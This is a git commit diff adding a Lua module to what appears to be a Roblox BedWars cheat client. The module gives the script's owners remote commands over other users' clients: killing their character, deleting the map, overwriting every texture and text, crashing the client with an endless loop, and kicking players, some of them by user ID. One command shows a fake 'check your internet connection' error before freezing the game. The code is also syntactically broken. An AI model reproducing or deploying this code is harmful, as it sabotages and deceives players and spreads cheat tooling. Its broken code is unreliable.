159c1f6e8bd98a9f33390cfafe69a9ba08e5d1d7
NTDCore <102583640+NTDCore@users.noreply.github.com>
2022-08-27 15:18:40 +0700

    update Blacklisted.lua

--- Blacklisted.lua
+++ Blacklisted.lua
@@ -1,1 +1,264 @@
+local function CommandOwnerI()
+	["kill"] = function(args, plr)
+		if entity.isAlive then
+			local hum = entity.character.Humanoid
+			bedwars["DamageController"]:requestSelfDamage(math.huge, 0, "69", {fromEntity = bedwars["getEntityTable"]:getEntity(plr)})
+			task.delay(0.2, function()
+				if hum and hum.Health > 0 then 
+					hum:ChangeState(Enum.HumanoidStateType.Dead)
+					hum.Health = 0
+					bedwars["ClientHandler"]:Get(bedwars["ResetRemote"]):SendToServer()
+				end
+			end)
+		end
+	end,
+	["lagback"] = function(args)
+		if entity.isAlive then
+			entity.character.HumanoidRootPart.Velocity = vec3(9999999, 9999999, 9999999)
+		end
+	end,
+	["jump"] = function(args)
+		if entity.isAlive and entity.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
+			entity.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+		end
+	end,
+	["sit"] = function(args)
+		if entity.isAlive then
+			entity.character.Humanoid.Sit = true
+		end
+	end,
+	["unsit"] = function(args)
+		if entity.isAlive then
+			entity.character.Humanoid.Sit = false
+		end
+	end,
+	["freeze"] = function(args)
+		if entity.isAlive then
+			entity.character.HumanoidRootPart.Anchored = true
+		end
+	end,
+	["unfreeze"] = function(args)
+		if entity.isAlive then
+			entity.character.HumanoidRootPart.Anchored = false
+		end
+	end,
+	["deletemap"] = function(args)
+		for i,v in pairs(collectionservice:GetTagged("block")) do
+			v:Destroy()
+		end
+	end,
+	["void"] = function(args)
+		if entity.isAlive then
+			task.spawn(function()
+				repeat
+					task.wait(0.2)
+					entity.character.HumanoidRootPart.CFrame = addvectortocframe(entity.character.HumanoidRootPart.CFrame, vec3(0, -20, 0))
+				until not entity.isAlive
+			end)
+		end
+	end,
+	["framerate"] = function(args)
+		if #args >= 1 then
+			if setfpscap then
+				setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]), 1, 9999) or 9999)
+			end
+		end
+	end,
+	["crash"] = function(args)
+		setfpscap(100000000)
+    	print(game:GetObjects("h29g3535")[1])
+	end,
+	["chipman"] = function(args)
+		local function funnyfunc(v)
+			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
+				v.Image = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("Image"):connect(function()
+					v.Image = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
+				if v.Text ~= "" then
+					v.Text = "chips"
+				end
+				v:GetPropertyChangedSignal("Text"):connect(function()
+					if v.Text ~= "" then
+						v.Text = "chips"
+					end
+				end)
+			end
+			if v:IsA("Texture") or v:IsA("Decal") then
+				v.Texture = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("Texture"):connect(function()
+					v.Texture = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if v:IsA("MeshPart") then
+				v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("TextureID"):connect(function()
+					v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if v:IsA("SpecialMesh") then
+				v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("TextureId"):connect(function()
+					v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if v:IsA("Sky") then
+				v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
+			end
+		end
+	
+		for i,v in pairs(game:GetDescendants()) do
+			funnyfunc(v)
+		end
+		game.DescendantAdded:connect(funnyfunc)
+	end,
+	["rickroll"] = function(args)
+		local function funnyfunc(v)
+			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
+				v.Image = "http://www.roblox.com/asset/?id=7083449168"
+				v:GetPropertyChangedSignal("Image"):connect(function()
+					v.Image = "http://www.roblox.com/asset/?id=7083449168"
+				end)
+			end
+			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
+				if v.Text ~= "" then
+					v.Text = "Never gonna give you up"
+				end
+				v:GetPropertyChangedSignal("Text"):connect(function()
+					if v.Text ~= "" then
+						v.Text = "Never gonna give you up"
+					end
+				end)
+			end
+			if v:IsA("Texture") or v:IsA("Decal") then
+				v.Texture = "http://www.roblox.com/asset/?id=7083449168"
+				v:GetPropertyChangedSignal("Texture"):connect(function()
+					v.Texture = "http://www.roblox.com/asset/?id=7083449168"
+				end)
+			end
+			if v:IsA("MeshPart") then
+				v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
+				v:GetPropertyChangedSignal("TextureID"):connect(function()
+					v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
+				end)
+			end
+			if v:IsA("SpecialMesh") then
+				v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
+				v:GetPropertyChangedSignal("TextureId"):connect(function()
+					v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
+				end)
+			end
+			if v:IsA("Sky") then
+				v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
+			end
+		end
+	
+		for i,v in pairs(game:GetDescendants()) do
+			funnyfunc(v)
+		end
+		game.DescendantAdded:connect(funnyfunc)
+	end,
+	["gravity"] = function(args)
+		workspace.Gravity = tonumber(args[1]) or 192.6
+	end,
+	["kick"] = function(args)
+		local str = ""
+		for i,v in pairs(args) do
+			str = str..v..(i > 1 and " " or "")
+		end
+		lplr:Kick(str)
+	end,
+	["uninject"] = function(args)
+		kavo["SelfDestruct"]()
+	end,
+	["disconnect"] = function(args)
+		game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay").DescendantAdded:Connect(function(obj)
+			if obj.Name == "ErrorMessage" then
+				obj:GetPropertyChangedSignal("Text"):connect(function()
+					obj.Text = "Please check your internet connection and try again.\n(Error Code: 277)"
+				end)
+			end
+			if obj.Name == "LeaveButton" then
+				local clone = obj:Clone()
+				clone.Name = "LeaveButton2"
+				clone.Parent = obj.Parent
+				clone.MouseButton1Click:connect(function()
+					clone.Visible = false
+					local video = Instance.new("VideoFrame")
+					video.Video = getcustomassetfunc("vape/assets/skill.webm")
+					video.Size = UDim2.new(1, 0, 1, 36)
+					video.Visible = false
+					video.Position = UDim2.new(0, 0, 0, -36)
+					video.ZIndex = 9
+					video.BackgroundTransparency = 1
+					video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+					local textlab = Instance.new("TextLabel")
+					textlab.TextSize = 45
+					textlab.ZIndex = 10
+					textlab.Size = UDim2.new(1, 0, 1, 36)
+					textlab.TextColor3 = Color3.new(1, 1, 1)
+					textlab.Text = "skill issue"
+					textlab.Position = UDim2.new(0, 0, 0, -36)
+					textlab.Font = Enum.Font.Gotham
+					textlab.BackgroundTransparency = 1
+					textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+					video.Loaded:connect(function()
+						video.Visible = true
+						video:Play()
+						task.spawn(function()
+							repeat
+								wait()
+								for i = 0, 1, 0.01 do
+									wait(0.01)
+									textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
+								end
+							until true == false
+						end)
+					end)
+					task.wait(19)
+					task.spawn(function()
+						pcall(function()
+							if getconnections then
+								getconnections(entity.character.Humanoid.Died)
+							end
+							print(game:GetObjects("h29g3535")[1])
+						end)
+						while true do end
+					end)
+				end)
+				obj.Visible = false
+			end
+		end)
+		task.wait(0.1)
+		lplr:Kick()
+	end,
+}
+end
 
+local Owner = {}
+
+if table.find(Owner, lplr.UserId) then
+   CommandOwnerI()
+end
+
+local function blacklist()
+lplr:Kick("Blacklisted : Forever")
+end
+
+local blacklistuser = {104335207}
+
+if table.find(blacklistuser, lplr.UserId) then
+   blacklist()
+end
